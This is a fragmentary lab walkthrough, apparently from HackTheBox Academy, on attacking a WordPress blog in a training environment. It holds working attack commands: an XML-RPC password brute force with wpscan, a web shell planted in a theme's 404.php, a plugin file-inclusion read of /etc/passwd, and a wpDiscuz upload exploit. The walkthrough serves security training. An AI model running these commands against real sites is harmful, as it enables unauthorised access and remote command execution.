...
```shell-session
xF1NN@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
...
![WordPress theme editor showing 404.php with a system command vulnerability in the Twenty Nineteen theme.](https://academy.hackthebox.com/storage/modules/113/theme_editor.png)
...
```shell-session
xF1NN@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
...
```shell-session
xF1NN@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
...
```shell-session
xF1NN@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
...
```shell-session
xF1NN@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
...
![Attacking_Common_Applications_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_6.png)

Once inside the admin panel, students need to click on "Appearance -> Theme Editor":

![Attacking_Common_Applications_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_7.png)

Students then need to select the theme "Twenty Nineteen":

![Attacking_Common_Applications_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_8.png)
...
![Attacking_Common_Applications_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_9.png)
